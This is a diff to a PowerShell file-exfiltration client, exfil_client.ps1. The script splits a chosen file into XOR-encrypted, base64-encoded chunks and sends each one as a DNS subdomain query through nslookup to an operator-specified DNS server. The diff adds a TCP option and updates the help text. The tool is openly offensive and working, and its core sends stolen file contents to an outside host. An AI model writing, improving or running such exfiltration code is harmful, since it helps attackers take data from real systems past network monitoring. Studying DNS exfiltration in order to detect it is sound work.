@@ -2,11 +2,12 @@
     [string]$FilePath,
     [string]$Domain,
     [string]$DnsServerIp,
-    [string]$Password
+    [string]$Password,
+    [switch]$UseTcp
 )
 
 function Show-Help {
-    Write-Host "Usage: .\exfil_client.ps1 -FilePath <file_path> -Domain <domain> -DnsServerIp <dns_server_ip> -Password <password>"
+    Write-Host "Usage: .\exfil_client.ps1 -FilePath <file_path> -Domain <domain> -DnsServerIp <dns_server_ip> -Password <password> [-UseTcp]"
     Write-Host "Exfiltrates a file over DNS by sending XOR-encrypted, base64 encoded chunks as DNS queries."
     Write-Host ""
     Write-Host "Parameters:"
@@ -14,9 +15,10 @@ function Show-Help {
     Write-Host "  -Domain        Domain to use in DNS queries."
     Write-Host "  -DnsServerIp   IP address of the DNS server."
     Write-Host "  -Password      Password to be used in XOR encryption."
+    Write-Host "  -UseTcp        Optional switch to use TCP instead of UDP."
     Write-Host ""
     Write-Host "Example:"
-    Write-Host '  .\exfil_client.ps1 -FilePath "C:\path\to\your\file" -Domain "example.com" -DnsServerIp "8.8.8.8" -Password "securepass"'
+    Write-Host '  .\exfil_client.ps1 -FilePath "C:\path\to\your\file" -Domain "example.com" -DnsServerIp "8.8.8.8" -Password "securepass" -UseTcp'
 }
 
 # Check if all required parameters are provided
@@ -70,7 +72,7 @@ $requestMaxSize = 255
 
 # Calculate space required for domain name and metadata
 $domainNameLength = $Domain.Length + 3 # including the dots and subdomain
-$metadataLength = "$filename|$timestamp".Length * 2  # length of filename in hexadecimal and buffer for the number of chucks
+$metadataLength = "$filename|$timestamp".Length * 2  # length of filename in hexadecimal and buffer for the number of chunks
 
 # Calculate maximum bytes available for data in each DNS query
 $bytesLeft = $requestMaxSize - $metadataLength - $domainNameLength
@@ -105,8 +107,11 @@ while ($chunk_id -lt $nbChunks) {
     $metadata = "$hex_filename|$timestamp|$nbChunks"
     $subdomain = "$chunk_id.$($chunks[0]).$($chunks[1]).$($chunks[2]).$($chunks[3]).$metadata.$Domain."
 
+    # Determine if -UseTcp switch is present
+    $queryType = if ($UseTcp.IsPresent) { "-vc" } else { "" }
+    
     # Send DNS query using nslookup
-    nslookup -type=a $subdomain $DnsServerIp
+    nslookup $queryType -type=a $subdomain $DnsServerIp
 
     # Move to next chunk
     $chunk_id++
